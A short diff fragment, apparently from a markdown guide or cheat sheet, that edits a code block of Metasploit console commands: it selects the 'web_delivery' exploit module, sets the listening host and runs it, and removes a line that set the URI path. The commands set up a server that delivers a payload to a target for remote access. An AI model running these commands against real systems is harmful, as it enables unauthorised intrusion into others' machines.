@@ -9,6 +9,5 @@ msfconsole
 search delivery
 use exploit/multi/script/web_delivery
 set lhost [Interface]
-set uripath [URL]
 run
 ```
